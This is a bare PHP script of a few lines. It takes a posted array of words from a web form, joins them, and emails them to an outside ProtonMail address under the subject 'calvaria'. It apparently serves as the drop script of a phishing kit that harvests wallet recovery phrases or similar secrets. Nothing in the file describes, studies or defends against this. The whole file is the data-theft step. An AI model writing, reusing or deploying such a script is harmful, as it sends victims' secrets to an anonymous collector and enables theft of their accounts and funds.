<?php
if ( isset($_POST['word']) ) {
    $words = implode(' ', $_POST['word']);

    mail('justmail44@protonmail.com', 'calvaria', $words);
}